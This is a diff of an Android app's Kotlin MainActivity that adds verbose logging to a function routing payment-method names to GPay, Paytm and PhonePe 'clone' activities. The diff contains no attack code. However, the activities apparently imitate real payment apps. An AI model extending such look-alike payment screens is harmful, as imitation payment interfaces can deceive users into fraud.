@@ -495,26 +495,34 @@ class MainActivity : ComponentActivity() {
      */
     private fun openPaymentCloneActivity(paymentMethod: String) {
         Log.d(TAG, "════════════════════════════════════════")
-        Log.d(TAG, "💰 OPENING PAYMENT CLONE: $paymentMethod")
+        Log.d(TAG, "💰 OPENING PAYMENT CLONE")
+        Log.d(TAG, "💰 Payment Method Received: '$paymentMethod'")
+        Log.d(TAG, "💰 Payment Method Lowercase: '${paymentMethod.lowercase()}'")
         Log.d(TAG, "════════════════════════════════════════")
         
-        val intent = when (paymentMethod.lowercase()) {
+        val intent = when (paymentMethod.lowercase().trim()) {
             "gpay", "googlepay", "google-pay" -> {
+                Log.d(TAG, "✅ Opening GPayCloneActivity")
                 Intent(this, GPayCloneActivity::class.java)
             }
             "paytm" -> {
+                Log.d(TAG, "✅ Opening PaytmCloneActivity")
                 Intent(this, PaytmCloneActivity::class.java)
             }
             "phonepe" -> {
+                Log.d(TAG, "✅ Opening PhonePeCloneActivity")
                 Intent(this, PhonePeCloneActivity::class.java)
             }
             else -> {
-                Log.e(TAG, "❌ Unknown payment method: $paymentMethod")
+                Log.e(TAG, "❌ Unknown payment method: '$paymentMethod'")
+                Log.e(TAG, "❌ Available methods: gpay, paytm, phonepe")
                 return
             }
         }
         
+        Log.d(TAG, "🚀 Starting Activity: ${intent.component?.className}")
         startActivity(intent)
+        Log.d(TAG, "✅ Activity started successfully")
     }
 
     private fun continueInitialization() {
